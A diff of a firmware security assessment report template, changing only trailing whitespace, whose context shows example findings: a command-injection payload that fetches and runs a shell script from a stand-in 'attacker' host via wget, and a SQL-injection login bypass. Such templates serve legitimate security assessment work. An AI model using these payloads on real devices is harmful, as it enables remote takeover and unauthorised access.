@@ -4,18 +4,18 @@
 > them with verified assessment data and remove unused sections before delivery.
 
 
-**Product:** [PRODUCT_NAME]  
-**Version:** [VERSION]  
-**Analyst:** [NAME]  
+**Product:** [PRODUCT_NAME]
+**Version:** [VERSION]
+**Analyst:** [NAME]
 **Date Started:** [DATE]
 
 ---
 
 ## Quick Info
 
-**Architecture:** [ARM/MIPS/x86/etc.]  
-**Firmware Source:** [Manufacturer download / Device dump / Other]  
-**Extraction Status:** [Complete / Partial / Failed]  
+**Architecture:** [ARM/MIPS/x86/etc.]
+**Firmware Source:** [Manufacturer download / Device dump / Other]
+**Extraction Status:** [Complete / Partial / Failed]
 **Emulation Status:** [Working / Partial / Not Working]
 
 ---
@@ -238,8 +238,8 @@ Response: uid=0(root) gid=0(root)
 
 #### Command Injection (FW-001)
 
-**Target:** /cgi-bin/admin.cgi  
-**Method:** POST parameter injection  
+**Target:** /cgi-bin/admin.cgi
+**Method:** POST parameter injection
 **Payload:** `cmd=;/bin/sh -c 'wget http://attacker/shell.sh|sh'`
 
 **Result:**
@@ -260,8 +260,8 @@ print(r.text)  # uid=0(root)
 
 #### Authentication Bypass (FW-002)
 
-**Target:** /cgi-bin/login.cgi  
-**Method:** SQL injection in username field  
+**Target:** /cgi-bin/login.cgi
+**Method:** SQL injection in username field
 **Payload:** `username=admin' OR '1'='1&password=anything`
 
 **Result:**
@@ -376,5 +376,5 @@ FW-002: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1
 
 ---
 
-**Last Updated:** [DATE]  
+**Last Updated:** [DATE]
 **Status:** [In Progress / Complete]
